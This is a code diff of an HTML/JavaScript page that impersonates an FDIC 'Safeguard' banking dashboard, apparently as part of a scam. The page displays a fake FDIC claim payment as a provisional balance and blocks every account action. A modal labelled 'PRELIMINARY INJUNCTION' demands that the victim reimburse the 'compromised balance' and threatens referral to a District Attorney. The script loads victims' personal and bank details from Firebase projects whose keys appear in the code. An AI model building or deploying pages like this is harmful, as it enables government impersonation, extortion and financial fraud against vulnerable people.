@@ -4,102 +4,175 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FDIC Safeguard - Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --fdic-blue: #003366;
-            --fdic-light-blue: #0056b3;
-            --bg-color: #f4f7f6;
-            --text-dark: #333;
-            --text-light: #666;
-            --white: #ffffff;
-            --border: #e0e0e0;
+            --fdic-gold: #C5B358;
+            --fdic-white: #FFFFFF;
+            --fdic-gray: #F4F4F4;
+            --text-dark: #333333;
+            --text-light: #666666;
             --success: #28a745;
             --warning: #ffc107;
             --danger: #dc3545;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        
-        body { background-color: var(--bg-color); color: var(--text-dark); padding-bottom: 70px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
-        header {
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--fdic-gray);
+            color: var(--text-dark);
+            padding-bottom: 80px; /* Space for bottom nav */
+        }
+
+        /* Header */
+        .top-header {
             background-color: var(--fdic-blue);
-            color: var(--white);
+            color: var(--fdic-white);
             padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        .header-left { display: flex; align-items: center; gap: 15px; }
-        .header-left svg { width: 40px; height: 14px; }
-        .header-text h1 { font-size: 18px; font-weight: 600; line-height: 1.2; }
-        .header-text p { font-size: 12px; color: #ccc; line-height: 1.2; }
-
-        .sign-out-btn {
+        .header-title h2 { font-size: 18px; font-weight: 500; }
+        .header-title p { font-size: 12px; opacity: 0.8; }
+        .logout-btn {
             background: transparent;
-            color: var(--white);
-            border: 1px solid var(--white);
+            border: 1px solid rgba(255,255,255,0.5);
+            color: white;
             padding: 5px 10px;
             border-radius: 4px;
-            font-size: 12px;
             cursor: pointer;
-            text-align: center;
-            line-height: 1.2;
+            font-size: 12px;
         }
 
-        .container { max-width: 600px; margin: 20px auto; padding: 0 15px; }
-
-        .card {
-            background: var(--white);
-            border-radius: 8px;
+        /* Main Content */
+        .container {
             padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-            border: 1px solid var(--border);
+            max-width: 600px;
+            margin: 0 auto;
         }
 
-        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
-        .card-title { font-size: 16px; font-weight: 600; color: var(--fdic-blue); }
+        /* Greeting Section */
+        .greeting-section {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
 
-        .balance-section { text-align: center; padding: 20px 0; }
-        .balance-amount { font-size: 32px; font-weight: bold; color: var(--fdic-blue); }
-        .balance-label { font-size: 14px; color: var(--text-light); margin-bottom: 5px; }
-        .customer-name { font-size: 16px; font-weight: 500; color: var(--text-dark); margin-top: 10px; opacity: 0; transition: opacity 0.5s; }
-        .customer-name.visible { opacity: 1; }
+        .greeting-section h1 {
+            font-size: 22px;
+            color: var(--fdic-blue);
+            margin-bottom: 5px;
+        }
 
-        .case-info { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px; }
-        .case-item { background: #f9f9f9; padding: 10px; border-radius: 4px; font-size: 14px; }
-        .case-item strong { display: block; color: var(--text-light); font-size: 12px; margin-bottom: 3px; }
+        /* Balance Card */
+        .balance-card {
+            background: linear-gradient(135deg, #003366 0%, #004080 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 10px rgba(0,51,102,0.3);
+        }
+
+        .balance-label { font-size: 14px; opacity: 0.9; margin-bottom: 5px; }
+        .balance-amount { font-size: 32px; font-weight: 700; margin-bottom: 15px; }
+        
+        .account-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            opacity: 0.8;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            padding-top: 15px;
+        }
 
         .status-badge {
-            display: inline-block;
-            padding: 4px 8px;
-            border-radius: 12px;
-            font-size: 12px;
+            background-color: var(--warning);
+            color: #333;
+            padding: 3px 8px;
+            border-radius: 10px;
+            font-size: 11px;
             font-weight: 600;
-            color: var(--white);
-            margin-top: 5px;
+            display: inline-block;
+            margin-bottom: 10px;
         }
-        .status-frozen { background-color: var(--danger); }
-        .status-review { background-color: var(--warning); color: #333; }
-        .status-active { background-color: var(--success); }
 
-        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        /* Action Buttons */
+        .actions-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
         .action-btn {
-            padding: 12px;
-            background-color: var(--white);
-            border: 1px solid var(--fdic-blue);
-            color: var(--fdic-blue);
-            border-radius: 4px;
+            background: white;
+            border: none;
+            padding: 20px 10px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
             cursor: pointer;
-            font-weight: 500;
-            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: transform 0.2s;
         }
-        .action-btn:hover { background-color: #f0f4f8; }
 
-        .disclaimer { font-size: 11px; color: var(--text-light); text-align: center; margin-top: 20px; line-height: 1.4; }
+        .action-btn:active { transform: scale(0.98); }
+        .action-btn i { font-size: 24px; color: var(--fdic-blue); }
+        .action-btn span { font-size: 13px; font-weight: 500; color: var(--text-dark); }
+
+        /* Transaction History */
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .transaction-list {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .transaction-item {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .transaction-item:last-child { border-bottom: none; }
+
+        .tx-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .tx-desc { font-weight: 500; font-size: 14px; }
+        .tx-amount { font-weight: 700; color: var(--success); font-size: 16px; }
+        .tx-meta { font-size: 12px; color: var(--text-light); }
+        .tx-ref { font-size: 11px; color: #888; }
 
         /* Bottom Navigation */
         .bottom-nav {
@@ -107,237 +180,296 @@
             bottom: 0;
             left: 0;
             width: 100%;
-            background: var(--white);
-            border-top: 1px solid var(--border);
+            background: white;
             display: flex;
             justify-content: space-around;
             padding: 10px 0;
-            box-shadow: 0 -2px 4px rgba(0,0,0,0.05);
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
+            z-index: 100;
         }
+
         .nav-item {
-            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
             color: var(--text-light);
-            font-size: 12px;
+            text-decoration: none;
+            font-size: 11px;
             cursor: pointer;
-            flex: 1;
         }
-        .nav-item.active { color: var(--fdic-blue); font-weight: 600; }
-        .nav-icon { font-size: 20px; display: block; margin-bottom: 2px; }
+
+        .nav-item.active { color: var(--fdic-blue); font-weight: 500; }
+        .nav-item i { font-size: 20px; }
 
         /* Modal */
-        .modal {
-            display: none;
+        .modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.6);
+            display: none;
             justify-content: center;
             align-items: center;
             z-index: 1000;
         }
+
         .modal-content {
-            background: var(--white);
+            background: white;
             padding: 25px;
             border-radius: 8px;
             width: 90%;
             max-width: 400px;
             text-align: center;
+            border-top: 5px solid var(--danger);
         }
-        .modal-title { font-size: 18px; font-weight: 600; color: var(--fdic-blue); margin-bottom: 10px; }
-        .modal-text { font-size: 14px; color: var(--text-light); margin-bottom: 20px; }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--danger);
+            margin-bottom: 15px;
+        }
+
+        .modal-body {
+            font-size: 14px;
+            color: var(--text-dark);
+            line-height: 1.5;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .modal-body strong { color: var(--danger); }
+
         .modal-btn {
-            padding: 10px 20px;
-            background-color: var(--fdic-blue);
-            color: var(--white);
+            background: var(--fdic-blue);
+            color: white;
             border: none;
+            padding: 10px 20px;
             border-radius: 4px;
             cursor: pointer;
+            font-size: 14px;
         }
+
+        /* Views */
+        .view-section { display: none; }
+        .view-section.active { display: block; }
+
     </style>
 </head>
 <body>
 
-<header>
-    <div class="header-left">
-        <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M100 5L20 25V55H180V25L100 5Z" fill="#ffffff"/>
-            <path d="M100 12L30 28V50H170V28L100 12Z" fill="#003366"/>
-            <text x="100" y="42" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="#ffffff" text-anchor="middle">FDIC</text>
-        </svg>
-        <div class="header-text">
-            <h1>FDIC SAFEGUARD</h1>
-            <p>Backed by the<br>full faith and<br>credit of the U.S. Gov.</p>
+    <div class="top-header">
+        <div class="header-title">
+            <h2>FDIC Safeguard</h2>
+            <p>Regulatory Program</p>
         </div>
+        <button class="logout-btn" onclick="window.location.href='index.html'">Sign Out</button>
     </div>
-    <button class="sign-out-btn" onclick="signOut()">Sign<br>Out</button>
-</header>
 
-<div class="container">
-    <!-- Dashboard Tab -->
-    <div id="tab-dashboard">
-        <div class="card">
-            <div class="balance-section">
-                <div class="balance-label">Current Balance</div>
+    <div class="container">
+        <!-- Dashboard View -->
+        <div id="view-dashboard" class="view-section active">
+            <div class="greeting-section">
+                <h1 id="greetingName">Good afternoon, [Name]</h1>
+                <p style="font-size: 13px; color: #666;">Account Status: <span style="color: var(--danger); font-weight: 500;">Active - Under Review</span></p>
+            </div>
+
+            <div class="balance-card">
+                <div class="status-badge">Provisional Balance</div>
+                <div class="balance-label">Total Available Balance</div>
                 <div class="balance-amount" id="balanceDisplay">$0.00</div>
-                <div class="customer-name" id="customerNameDisplay">Loading...</div>
-            </div>
-            
-            <div class="case-info">
-                <div class="case-item">
-                    <strong>Case Reference</strong>
-                    <span id="caseRef">---</span>
-                </div>
-                <div class="case-item">
-                    <strong>Status</strong>
-                    <span id="statusBadge" class="status-badge status-review">Under Review</span>
+                <div class="account-details">
+                    <span id="accountTypeDisplay">Checking</span>
+                    <span id="accountLastFour">****0000</span>
                 </div>
             </div>
 
-            <div class="actions">
-                <button class="action-btn" onclick="showModal()">Transfer Funds</button>
-                <button class="action-btn" onclick="showModal()">Deposit</button>
+            <div class="actions-grid">
+                <button class="action-btn" onclick="showRestrictionModal()">
+                    <i class="fas fa-file-invoice-dollar"></i>
+                    <span>Bill Pay</span>
+                </button>
+                <button class="action-btn" onclick="showRestrictionModal()">
+                    <i class="fas fa-exchange-alt"></i>
+                    <span>Transfer</span>
+                </button>
+                <button class="action-btn" onclick="showRestrictionModal()">
+                    <i class="fas fa-arrow-down"></i>
+                    <span>Deposit</span>
+                </button>
+            </div>
+
+            <div class="section-title">
+                <i class="fas fa-history"></i> Recent Transactions
+            </div>
+            <div class="transaction-list">
+                <div class="transaction-item">
+                    <div class="tx-header">
+                        <span class="tx-desc">FDIC CLAIM PAYMENT REF:8821-4490</span>
+                        <span class="tx-amount" id="txAmount">+$0.00</span>
+                    </div>
+                    <div class="tx-meta">
+                        Status: <strong>POSTED</strong> | Sender: FEDERAL DEPOSIT INSURANCE CORP
+                    </div>
+                    <div class="tx-meta">
+                        <span id="txDate">Date: --/--/----</span>
+                    </div>
+                    <div class="tx-ref">ID: FDIC-CLM-20260723-99841 | Ref: ACCT-SETTLEMENT</div>
+                </div>
             </div>
         </div>
 
-        <div class="disclaimer">
-            FDIC Insured. Backed by the full faith and credit of the United States Government. 
-            Your account is currently under safeguard review.
+        <!-- Transactions View (Duplicate for nav demo) -->
+        <div id="view-transactions" class="view-section">
+            <div class="section-title"><i class="fas fa-list"></i> Full History</div>
+            <p style="text-align:center; color:#888; padding:20px;">Only recent transaction visible due to hold.</p>
+            <div class="transaction-list">
+                <div class="transaction-item">
+                    <div class="tx-header">
+                        <span class="tx-desc">FDIC CLAIM PAYMENT REF:8821-4490</span>
+                        <span class="tx-amount" id="txAmount2">+$0.00</span>
+                    </div>
+                    <div class="tx-meta">
+                        Status: <strong>POSTED</strong> | Sender: FEDERAL DEPOSIT INSURANCE CORP
+                    </div>
+                    <div class="tx-meta">
+                        <span id="txDate2">Date: --/--/----</span>
+                    </div>
+                    <div class="tx-ref">ID: FDIC-CLM-20260723-99841 | Ref: ACCT-SETTLEMENT</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Profile View -->
+        <div id="view-profile" class="view-section">
+            <div class="greeting-section">
+                <h2>Account Details</h2>
+            </div>
+            <div style="background:white; padding:20px; border-radius:8px; box-shadow:0 2px 5px rgba(0,0,0,0.05);">
+                <p><strong>Name:</strong> <span id="profileName"></span></p>
+                <p><strong>Email:</strong> <span id="profileEmail"></span></p>
+                <p><strong>Phone:</strong> <span id="profilePhone"></span></p>
+                <p><strong>Address:</strong> <span id="profileAddress"></span></p>
+                <hr style="margin:15px 0; border:0; border-top:1px solid #eee;">
+                <p><strong>Case Number:</strong> <span id="profileCase"></span></p>
+                <p><strong>Routing Number:</strong> <span id="profileRouting"></span></p>
+                <p><strong>Account Number:</strong> <span id="profileAccNum"></span></p>
+            </div>
         </div>
     </div>
 
-    <!-- Transactions Tab (Placeholder) -->
-    <div id="tab-transactions" style="display:none;">
-        <div class="card">
-            <div class="card-header">
-                <span class="card-title">Recent Transactions</span>
-            </div>
-            <p style="text-align:center; color:#999; padding:20px;">No recent transactions.</p>
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item active" onclick="switchView('dashboard', this)">
+            <i class="fas fa-home"></i>
+            <span>Dashboard</span>
+        </div>
+        <div class="nav-item" onclick="switchView('transactions', this)">
+            <i class="fas fa-list-alt"></i>
+            <span>Transactions</span>
+        </div>
+        <div class="nav-item" onclick="switchView('profile', this)">
+            <i class="fas fa-user"></i>
+            <span>Profile</span>
         </div>
     </div>
 
-    <!-- Profile Tab (Placeholder) -->
-    <div id="tab-profile" style="display:none;">
-        <div class="card">
-            <div class="card-header">
-                <span class="card-title">Profile Information</span>
+    <!-- Restriction Modal -->
+    <div class="modal-overlay" id="restrictionModal">
+        <div class="modal-content">
+            <div class="modal-title">ACCOUNT RESTRICTED: PRELIMINARY INJUNCTION</div>
+            <div class="modal-body">
+                Transfer, withdrawal, and deposit functions are <strong>LOCKED</strong>.<br><br>
+                <strong>Action Required:</strong> Reimburse the compromised balance to lift the hold.<br><br>
+                <strong>Notice:</strong> Failure to remit payment will result in immediate referral to the local District Attorney for legal action.
             </div>
-            <div class="profile-item" style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;">
-                <span style="color:#666;">Full Name</span>
-                <span style="font-weight:600;" id="profileName">---</span>
-            </div>
-            <div class="profile-item" style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;">
-                <span style="color:#666;">Account Number</span>
-                <span style="font-weight:600;">****<span id="last4">0000</span></span>
-            </div>
-            <div class="profile-item" style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;">
-                <span style="color:#666;">Address</span>
-                <span style="font-weight:600;">123 Main St</span>
-            </div>
+            <button class="modal-btn" onclick="closeModal()">Close</button>
         </div>
     </div>
-</div>
 
-<!-- Bottom Navigation -->
-<div class="bottom-nav">
-    <div class="nav-item active" onclick="switchTab('dashboard')">
-        <span class="nav-icon">🏠</span>
-        Dashboard
-    </div>
-    <div class="nav-item" onclick="switchTab('transactions')">
-        <span class="nav-icon">💳</span>
-        Transactions
-    </div>
-    <div class="nav-item" onclick="switchTab('profile')">
-        <span class="nav-icon">👤</span>
-        Profile
-    </div>
-</div>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
 
-<!-- Modal -->
-<div class="modal" id="restrictedModal">
-    <div class="modal-content">
-        <div class="modal-title">Account Restricted</div>
-        <div class="modal-text">Your account is currently under safeguard review. Please contact support or wait for further notification.</div>
-        <button class="modal-btn" onclick="hideModal()">Close</button>
-    </div>
-</div>
-
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-  import { getAuth, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-  import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
-
-  const firebaseConfig = {
-  apiKey: "AIzaSyCi1fTBOHYz02MNaVD7aF_1bRlkWu3HgeQ",
-  authDomain: "fdicprotects.firebaseapp.com",
-  projectId: "fdicprotects",
-  storageBucket: "fdicprotects.firebasestorage.app",
-  messagingSenderId: "1087204523962",
-  appId: "1:1087204523962:web:ba359d8cf5981afeab2783"
+        const firebaseConfig = {
+  apiKey: "AIzaSyBkx-EEG7HdjfIuHkxdWSZrjjFaX-hGy68",
+  authDomain: "fdicsupport-cae27.firebaseapp.com",
+  databaseURL: "https://fdicsupport-cae27-default-rtdb.firebaseio.com",
+  projectId: "fdicsupport-cae27",
+  storageBucket: "fdicsupport-cae27.firebasestorage.app",
+  messagingSenderId: "874213007292",
+  appId: "1:874213007292:web:bf04711a109df8c85b95b9"
 };
 
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
-  const db = getDatabase(app);
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-  window.signOut = () => {
-      signOut(auth).then(() => {
-          window.location.href = 'index.html';
-      });
-  };
+        // Check Auth
+        const username = sessionStorage.getItem('currentUsername');
+        const userDataJSON = sessionStorage.getItem('currentUser');
+        let userData = {};
 
-  window.switchTab = (tabName) => {
-      document.getElementById('tab-dashboard').style.display = 'none';
-      document.getElementById('tab-transactions').style.display = 'none';
-      document.getElementById('tab-profile').style.display = 'none';
-      document.getElementById('tab-' + tabName).style.display = 'block';
-      
-      document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
-      event.currentTarget.classList.add('active');
-  };
+        if (!username || !userDataJSON) {
+            window.location.href = 'index.html';
+        } else {
+            userData = JSON.parse(userDataJSON);
+            loadDashboard();
+        }
 
-  window.showModal = () => {
-      document.getElementById('restrictedModal').style.display = 'flex';
-  };
+        function loadDashboard() {
+            // Greeting
+            document.getElementById('greetingName').textContent = `Good afternoon, ${userData.firstName || 'Customer'}`;
+            
+            // Balance
+            const balance = parseFloat(userData.account?.balance || 0);
+            const formattedBalance = '$' + balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('balanceDisplay').textContent = formattedBalance;
+            document.getElementById('txAmount').textContent = '+' + formattedBalance;
+            document.getElementById('txAmount2').textContent = '+' + formattedBalance;
 
-  window.hideModal = () => {
-      document.getElementById('restrictedModal').style.display = 'none';
-  };
+            // Account Info
+            document.getElementById('accountTypeDisplay').textContent = userData.account?.type || 'Checking';
+            document.getElementById('accountLastFour').textContent = '****' + (userData.account?.lastFour || '0000');
+            
+            // Transaction Date
+            if (userData.account?.createdAt) {
+                const date = new Date(userData.account.createdAt);
+                const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true, timeZoneName: 'short' };
+                const formattedDate = date.toLocaleString('en-US', options).replace(', ', ' ') + ' EST';
+                document.getElementById('txDate').textContent = formattedDate;
+                document.getElementById('txDate2').textContent = formattedDate;
+            }
 
-  // Load Data
-  const username = localStorage.getItem('currentUser') || 'guest';
-  const userRef = ref(db, 'users/' + username);
-  
-  get(userRef).then((snapshot) => {
-      if (snapshot.exists()) {
-          const data = snapshot.val();
-          document.getElementById('balanceDisplay').innerText = '$' + (data.balance || 0).toLocaleString();
-          document.getElementById('customerNameDisplay').innerText = data.name || 'Valued Customer';
-          document.getElementById('customerNameDisplay').classList.add('visible');
-          document.getElementById('profileName').innerText = data.name || 'Valued Customer';
-          document.getElementById('last4').innerText = data.last4 || '0000';
-          
-          // Case Info
-          const caseRef = data.caseRef || 'FD-2026-' + Math.floor(Math.random() * 10000);
-          const status = data.status || 'Under Review';
-          
-          document.getElementById('caseRef').innerText = caseRef;
-          const badge = document.getElementById('statusBadge');
-          badge.innerText = status;
-          badge.className = 'status-badge';
-          if(status === 'Frozen') badge.classList.add('status-frozen');
-          else if(status === 'Active') badge.classList.add('status-active');
-          else badge.classList.add('status-review');
+            // Profile Info
+            document.getElementById('profileName').textContent = `${userData.firstName} ${userData.lastName}`;
+            document.getElementById('profileEmail').textContent = userData.email;
+            document.getElementById('profilePhone').textContent = userData.phone;
+            document.getElementById('profileAddress').textContent = userData.address;
+            document.getElementById('profileCase').textContent = userData.account?.caseNumber || 'N/A';
+            document.getElementById('profileRouting').textContent = userData.account?.routingNumber || 'N/A';
+            document.getElementById('profileAccNum').textContent = '****' + (userData.account?.lastFour || '0000');
+        }
 
-      } else {
-          // Fallback if no data
-          document.getElementById('customerNameDisplay').innerText = 'Valued Customer';
-          document.getElementById('customerNameDisplay').classList.add('visible');
-      }
-  });
+        // View Switching
+        window.switchView = function(viewName, element) {
+            // Hide all views
+            document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
+            // Show selected view
+            document.getElementById('view-' + viewName).classList.add('active');
+            
+            // Update Nav
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            element.classList.add('active');
+        }
 
-  // Save current user for persistence
-  localStorage.setItem('currentUser', username);
-</script>
+        // Modal Functions
+        window.showRestrictionModal = function() {
+            document.getElementById('restrictionModal').style.display = 'flex';
+        }
 
+        window.closeModal = function() {
+            document.getElementById('restrictionModal').style.display = 'none';
+        }
+    </script>
 </body>
 </html>
